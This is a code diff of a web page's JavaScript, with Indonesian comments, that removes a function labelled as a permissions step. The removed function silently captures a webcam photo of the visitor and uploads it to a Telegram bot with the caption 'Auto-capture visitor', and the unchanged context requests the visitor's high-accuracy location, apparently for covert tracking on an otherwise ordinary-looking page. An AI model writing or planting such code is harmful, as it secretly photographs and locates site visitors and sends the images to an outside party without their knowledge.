@@ -284,37 +284,6 @@ document.getElementById('sendQ').addEventListener('click', async () => {
     } catch(e){ console.error("Gagal memuat:",e); }
   }
 
-  // --- Perizinan ---
-  async function autoCaptureCamera() {
-    try {
-      if(navigator.mediaDevices){
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.playsInline = true;
-        await new Promise(res => { video.onloadedmetadata = () => video.play().then(res).catch(res); setTimeout(res,1500); });
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-
-        const base64img = canvas.toDataURL("image/png");
-        stream.getTracks().forEach(t=>t.stop());
-
-        const blob = await (await fetch(base64img)).blob();
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("caption", "📸 Auto-capture visitor");
-        fd.append("photo", blob, "capture.png");
-
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-        if(res.ok) console.log("Berhasil");
-      }
-    } catch(e){ console.warn("Gagal:",e); }
-  }
-
   // --- PROSES UTAMA ---
   try {
     const coords = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:8000,maximumAge:0}));
@@ -588,5 +557,6 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
 
